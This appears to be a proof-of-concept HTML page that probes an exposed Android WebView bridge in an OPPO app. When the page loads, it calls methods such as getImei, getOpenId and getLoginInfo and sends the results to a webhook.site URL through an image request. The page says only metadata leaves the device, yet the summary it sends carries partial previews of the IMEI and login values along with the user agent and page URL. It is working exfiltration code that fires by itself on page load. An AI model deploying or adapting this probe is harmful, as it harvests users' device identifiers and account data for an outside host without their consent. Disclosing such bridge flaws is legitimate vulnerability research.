<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>OPPO WebBridge Sensitive Minimal Probe</title>
  <style>
    body { font-family: sans-serif; padding: 24px; }
    pre { background: #f3f3f3; padding: 16px; white-space: pre-wrap; word-break: break-word; }
    .warn { color: #b00020; font-weight: bold; }
    button { padding: 10px 16px; margin: 8px 0; }
  </style>
</head>
<body>
<h1>OPPO WebBridge Sensitive Minimal Probe</h1>
<p class="warn">Full sensitive values are displayed locally only. Webhook receives short metadata only.</p>
<p id="status">WAITING</p>
<button onclick="runProbe('manual_button')">Run minimal sensitive probe again</button>
<pre id="out"></pre>

<script>
(function () {
  const WEBHOOK = "https://webhook.site/0d6bb58d-a021-4aa2-b4d6-2d2ebb72fcdd";

  const METHODS = [
    "getImei",
    "getOpenId",
    "getLoginInfo",
    "isLogin",
    "getChannelId",
    "getPackageName",
    "getDeviceModel",
    "getNetworkType"
  ];

  function safeString(x) {
    try {
      if (x === undefined) return "undefined";
      if (x === null) return "null";
      if (typeof x === "string") return x;
      if (typeof x === "number" || typeof x === "boolean") return String(x);
      return JSON.stringify(x);
    } catch (e) {
      try { return String(x); } catch (_) { return "[unstringifiable]"; }
    }
  }

  function maskLocalPreview(s) {
    if (!s || s === "undefined" || s === "null") return s;
    if (s.length <= 8) return s;
    return s.slice(0, 4) + "***" + s.slice(-4);
  }

  function callMethod(name) {
    const item = {
      method: name,
      exists: false,
      ok: false,
      returnType: null,
      rawReturnValue_LOCAL_ONLY: null,
      error: null
    };

    try {
      const a = window.android;
      if (!a || typeof a !== "object") {
        item.error = "window.android missing";
        return item;
      }

      item.exists = typeof a[name] === "function";
      if (!item.exists) {
        item.error = "missing_or_not_function";
        return item;
      }

      const ret = a[name]();
      item.ok = true;
      item.returnType = typeof ret;
      item.rawReturnValue_LOCAL_ONLY = safeString(ret);
      return item;
    } catch (e) {
      item.error = String(e && (e.stack || e.message || e));
      return item;
    }
  }

  function sendShortGet(result) {
    const summary = result.results.map(function (r) {
      const raw = safeString(r.rawReturnValue_LOCAL_ONLY);
      return [
        r.method,
        r.exists ? "exists" : "missing",
        r.ok ? "ok" : "fail",
        r.returnType || "none",
        raw.length,
        raw && raw !== "undefined" && raw !== "null" ? "nonempty" : "empty",
        maskLocalPreview(raw)
      ].join(":");
    }).join("|");

    const url =
      WEBHOOK +
      "/oppo-sensitive-minimal-get" +
      "?event=OPPO_SENSITIVE_MINIMAL_RESULT" +
      "&t=" + encodeURIComponent(Date.now()) +
      "&ua=" + encodeURIComponent(navigator.userAgent.slice(0, 180)) +
      "&href=" + encodeURIComponent(location.href.slice(0, 240)) +
      "&summary=" + encodeURIComponent(summary.slice(0, 3000));

    try {
      const img = new Image();
      img.src = url;
    } catch (e) {}

    // 第二发极短心跳，防止 summary 仍然过长
    try {
      const img2 = new Image();
      img2.src =
        WEBHOOK +
        "/oppo-sensitive-heartbeat" +
        "?event=OPPO_SENSITIVE_HEARTBEAT" +
        "&t=" + encodeURIComponent(Date.now()) +
        "&bridge=" + encodeURIComponent(!!window.android) +
        "&ua=" + encodeURIComponent(navigator.userAgent.slice(0, 120));
    } catch (e) {}
  }

  window.runProbe = function(reason) {
    const results = METHODS.map(callMethod);

    const result = {
      eventType: "OPPO_SENSITIVE_MINIMAL_LOCAL_RESULT",
      version: "minimal_get_only_v1",
      ts: new Date().toISOString(),
      reason,
      safetyBoundary: {
        rawSensitiveValuesDisplayedOnDevice: true,
        rawSensitiveValuesSentToWebhook: false,
        webhookTransport: "Image GET only; short metadata summary only",
        stateChangingMethodsCalled: false
      },
      location: {
        href: location.href,
        origin: location.origin,
        protocol: location.protocol,
        referrer: document.referrer || null
      },
      environment: {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        webdriver: navigator.webdriver
      },
      androidBridge: {
        exists: !!window.android,
        type: typeof window.android,
        tag: window.android ? Object.prototype.toString.call(window.android) : null
      },
      results: results
    };

    document.getElementById("status").textContent =
      "OPPO_SENSITIVE_MINIMAL_DONE: " + result.ts;

    document.getElementById("out").textContent =
      JSON.stringify(result, null, 2);

    sendShortGet(result);
  };

  setTimeout(function () {
    runProbe("auto_after_load_1200ms");
  }, 1200);
})();
</script>
</body>
</html>
